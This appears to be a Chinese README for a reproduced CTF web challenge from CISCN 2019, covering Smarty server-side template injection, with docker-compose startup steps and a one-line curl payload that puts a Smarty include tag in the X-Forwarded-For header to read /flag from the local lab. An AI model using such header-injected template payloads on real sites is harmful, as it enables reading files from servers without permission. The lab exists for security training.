# CISCN2019 华东南赛区 Web11

## 题目详情

- **CISCN2019 华东南赛区 Web11**

复现完才发现其实蛮简单- -

## 考点

-  Smarty SSTI

## 启动

    docker-compose up -d
    open http://127.0.0.1:80/

## Payload

```
curl -X GET http://127.0.0.1:8302/xff/ -H "X-Forwarded-For: {include file='/flag'}"
```

## 版权

该题目复现环境尚未取得主办方及出题人相关授权，如果侵权，请联系本人删除（ i@zhaoj.in ）
